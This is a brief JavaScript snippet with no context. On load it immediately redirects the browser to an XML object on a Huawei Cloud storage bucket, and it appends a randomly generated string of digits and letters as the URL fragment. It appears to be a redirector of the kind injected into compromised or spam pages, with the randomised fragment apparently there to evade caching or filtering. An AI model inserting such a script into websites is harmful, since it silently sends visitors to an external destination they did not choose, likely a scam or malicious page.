var urls=[
' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/82a70c0abaee46a0b4f149b9e2a30a2e.xml#{nnnnnnn}{wwww}',
];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
